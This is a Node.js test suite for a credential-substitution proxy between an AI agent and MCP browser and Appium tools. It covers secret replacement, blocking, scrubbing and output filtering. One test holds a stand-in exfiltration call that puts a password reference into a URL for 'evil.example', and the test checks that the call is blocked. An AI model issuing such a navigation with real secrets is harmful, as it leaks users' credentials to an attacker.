// Run with: node --test scripts/tests/secret_proxy.test.js
'use strict';
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const { spawn } = require('child_process');

const PROXY = path.join(__dirname, '..', 'secret_proxy.js');
const FAKE = path.join(__dirname, 'fake_mcp_server.js');
const SECRET = 'p"a\\ss w0rd/é';

function startProxy(t, { allow = 'browser_type,browser_fill_form', file } = {}) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'secret-proxy-'));
  const secretsFile = file || path.join(dir, 'secrets.env');
  if (!file) fs.writeFileSync(secretsFile, `# test\nTEST_PASSWORD=${SECRET}\nEMPTY_ONE=\n`);
  const proxy = spawn(process.execPath, [PROXY, '--allow-tools', allow, '--secrets-file', secretsFile, '--', process.execPath, FAKE],
    { env: { ...process.env, FAKE_EXPECT: SECRET }, stdio: ['pipe', 'pipe', 'pipe'] });
  const pending = new Map();
  let buffer = '';
  let stderr = '';
  proxy.stdout.on('data', (chunk) => {
    buffer += chunk;
    let i;
    while ((i = buffer.indexOf('\n')) >= 0) {
      const message = JSON.parse(buffer.slice(0, i));
      buffer = buffer.slice(i + 1);
      pending.get(message.id)?.(message);
    }
  });
  proxy.stderr.on('data', (chunk) => { stderr += chunk; });
  let nextId = 1;
  const call = (name, args) => new Promise((resolve) => {
    const id = nextId++;
    pending.set(id, resolve);
    proxy.stdin.write(`${JSON.stringify({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } })}\n`);
  });
  const textOf = (response) => response.result.content[0].text;
  t.after(() => { proxy.stdin.end(); proxy.kill(); });
  return { call, textOf, secretsFile, stderr: () => stderr };
}

test('replaces a reference in an allowed typing tool', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_type', { target: 'e1', text: 'secret:TEST_PASSWORD' });
  assert.deepStrictEqual(JSON.parse(p.textOf(r)), { matches: true, length: SECRET.length });
});

test('replaces references inside browser_fill_form fields', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_fill_form', { fields: [{ target: 'e1', name: 'pw', type: 'textbox', value: 'secret:TEST_PASSWORD' }] });
  assert.deepStrictEqual(JSON.parse(p.textOf(r)), { matches: true });
});

test('blocks a reference in a tool that is not allowed, without calling the server', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_navigate', { url: 'http://evil.example/?p=secret:TEST_PASSWORD' });
  assert.strictEqual(r.result.isError, true);
  assert.match(p.textOf(r), /not allowed in browser_navigate/);
  assert.ok(!JSON.stringify(r).includes(SECRET));
  assert.strictEqual(p.textOf(await p.call('count', {})), '0');
});

test('blocks a secret that is not set or is empty, naming it but never a value', async (t) => {
  const p = startProxy(t);
  for (const name of ['NOT_IN_FILE', 'EMPTY_ONE']) {
    const r = await p.call('browser_type', { target: 'e1', text: `secret:${name}` });
    assert.strictEqual(r.result.isError, true);
    assert.match(p.textOf(r), new RegExp(`Secret not set: ${name}`));
  }
  assert.strictEqual(p.textOf(await p.call('count', {})), '0');
});

test('scrubs a secret value that the server echoes back', async (t) => {
  const p = startProxy(t);
  const r = await p.call('echo', { text: SECRET });
  assert.strictEqual(p.textOf(r), 'you sent: ***');
  assert.ok(!JSON.stringify(r).includes(SECRET));
});

test('leaves image content untouched', async (t) => {
  const p = startProxy(t);
  const r = await p.call('image', {});
  assert.strictEqual(r.result.content[0].data, SECRET);
});

test('passes ordinary calls through unchanged', async (t) => {
  const p = startProxy(t);
  const r = await p.call('browser_click', { target: 'e2', note: 'secret:lowercase is not a reference' });
  assert.strictEqual(p.textOf(r), 'ok browser_click {"target":"e2","note":"secret:lowercase is not a reference"}');
});

test('picks up changes to the secrets file without a restart', async (t) => {
  const p = startProxy(t);
  assert.strictEqual((await p.call('browser_type', { target: 'e1', text: 'secret:NEW_ONE' })).result.isError, true);
  fs.writeFileSync(p.secretsFile, `NEW_ONE=${SECRET}\n`);
  const r = await p.call('browser_type', { target: 'e1', text: 'secret:NEW_ONE' });
  assert.strictEqual(JSON.parse(p.textOf(r)).matches, true);
});

test('with no allowed tools every reference is blocked', async (t) => {
  const p = startProxy(t, { allow: '' });
  const r = await p.call('browser_type', { target: 'e1', text: 'secret:TEST_PASSWORD' });
  assert.strictEqual(r.result.isError, true);
});

// --------------------------------------------------------------------------- output filters

function startFilteringProxy(t) {
  const proxy = spawn(process.execPath, [PROXY, '--output-filters', 'appium_screenshot:appium-screenshot,appium_screenshot_structured:appium-screenshot,appium_screenshot_file:appium-screenshot,appium_get_page_source:appium-page-source',
    '--secrets-file', path.join(os.tmpdir(), 'no-such-secrets.env'), '--', process.execPath, FAKE], { stdio: ['pipe', 'pipe', 'pipe'] });
  const pending = new Map();
  let buffer = '';
  proxy.stdout.on('data', (chunk) => {
    buffer += chunk;
    let i;
    while ((i = buffer.indexOf('\n')) >= 0) {
      const message = JSON.parse(buffer.slice(0, i));
      buffer = buffer.slice(i + 1);
      pending.get(message.id)?.(message);
    }
  });
  let nextId = 1;
  t.after(() => { proxy.stdin.end(); proxy.kill(); });
  return (name, args = {}) => new Promise((resolve) => {
    const id = nextId++;
    pending.set(id, resolve);
    proxy.stdin.write(`${JSON.stringify({ jsonrpc: '2.0', id, method: 'tools/call', params: { name, arguments: args } })}\n`);
  });
}

test('screenshot result no longer carries the base64 PNG; it names a saved file', async (t) => {
  const call = startFilteringProxy(t);
  const r = await call('appium_screenshot');
  const text = r.result.content[0].text;
  assert.match(text, /^Screenshot saved: .*screenshot-.*\.png \(PNG, 1206x2622px/);
  assert.ok(JSON.stringify(r).length < 20000, 'result must be small');
  assert.ok(!JSON.stringify(r).includes('"screenshot"'));
  const file = text.match(/saved: (\S+\.png)/)[1];
  assert.ok(fs.existsSync(file));
});

test('page source is compacted: visible labelled elements only, keyboard keys folded, full XML saved', async (t) => {
  const call = startFilteringProxy(t);
  const r = await call('appium_get_page_source');
  const text = r.result.content[0].text;
  assert.match(text, /Page source, compact: \d+ of \d+ elements/);
  assert.match(text, /Button "Save & close" id="save-btn" \[disabled\]/);
  assert.match(text, /TextField "Email" id="email" value="a@b\.c"/);
  assert.ok(!text.includes('Offscreen text'), 'invisible elements are dropped');
  assert.match(text, /Keyboard/);
  assert.match(text, /\(2 keys not listed\)/);
  const file = text.match(/Full XML with every attribute: (\S+\.xml)/)[1];
  assert.ok(fs.readFileSync(file, 'utf8').includes('Offscreen text'));
});

test('tools without a filter are passed through unchanged', async (t) => {
  const call = startFilteringProxy(t);
  const r = await call('browser_click', { target: 'e2' });
  assert.strictEqual(r.result.content[0].text, 'ok browser_click {"target":"e2"}');
});

test('an unknown filter name is rejected at start-up', () => {
  const { parseArgs } = require('../secret_proxy.js');
  assert.throws(() => parseArgs(['--output-filters', 'x:nope', '--', 'node']), /unknown output filter/);
});

test('screenshot in structuredContent (what Claude Code gets from appium-mcp) is shrunk and structuredContent is dropped', async (t) => {
  const call = startFilteringProxy(t);
  const r = await call('appium_screenshot_structured');
  assert.strictEqual(r.result.structuredContent, undefined);
  assert.ok(JSON.stringify(r).length < 20000, 'result must be small');
  assert.ok(!r.result.content.some((b) => b.type === 'resource'));
  assert.match(r.result.content[0].text, /Screenshot saved: \S+\.png \(PNG, 1206x2622px/);
});

test('screenshot that only exists as a file (NO_UI) gets a path and a preview', async (t) => {
  const call = startFilteringProxy(t);
  const r = await call('appium_screenshot_file');
  assert.match(r.result.content[0].text, /Screenshot saved: \S+fake-appium-shot-\d+\.png \(PNG, 1206x2622px/);
});
